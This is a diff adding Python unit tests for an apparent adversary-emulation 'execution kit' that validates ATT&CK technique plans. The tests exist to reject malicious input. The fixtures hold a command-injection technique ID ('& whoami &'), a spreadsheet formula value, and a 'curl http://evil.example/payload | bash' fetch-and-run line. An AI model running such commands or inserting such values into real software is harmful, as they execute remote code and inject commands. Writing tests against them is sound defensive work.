@@ -166,6 +166,20 @@ class ExecutionPlanTests(unittest.TestCase):
         with self.assertRaisesRegex(ExecutionKitError, "must be true or false"):
             normalize_plan(document)
 
+    def test_an_empty_stage_is_rejected(self):
+        document = plan_fixture("linux")
+        document["stages"][0]["techniques"] = []
+        with self.assertRaisesRegex(ExecutionKitError, "invalid stage"):
+            normalize_plan(document)
+
+    def test_no_executable_step_error_names_every_supported_platform(self):
+        document = plan_fixture("macos")
+        technique = document["stages"][0]["techniques"][0]
+        technique["supported"] = False
+        technique["command"]["unsupported"] = True
+        with self.assertRaisesRegex(ExecutionKitError, "Windows, Linux, or macOS"):
+            normalize_plan(document)
+
     def test_csv_is_excel_compatible_and_formula_safe(self):
         document = plan_fixture(command="=DANGEROUS()")
         plan = normalize_plan(document)
@@ -327,6 +341,12 @@ class ExecutionKitArchiveTests(unittest.TestCase):
 
 
 class CatalogRebindTests(unittest.TestCase):
+    def test_hostile_fallback_identifier_is_rejected_before_catalog_substitution(self):
+        document = plan_fixture("windows")
+        document["stages"][0]["techniques"][0]["id"] = 'T9999" & whoami & echo "'
+        with self.assertRaisesRegex(ExecutionKitError, "ATT&CK technique ID"):
+            build_execution_kit(document)
+
     def test_client_command_text_is_replaced_with_the_catalog_record(self):
         document = plan_fixture("linux", command="curl http://evil.example/payload | bash")
         rebound = rebind_to_catalog(document)
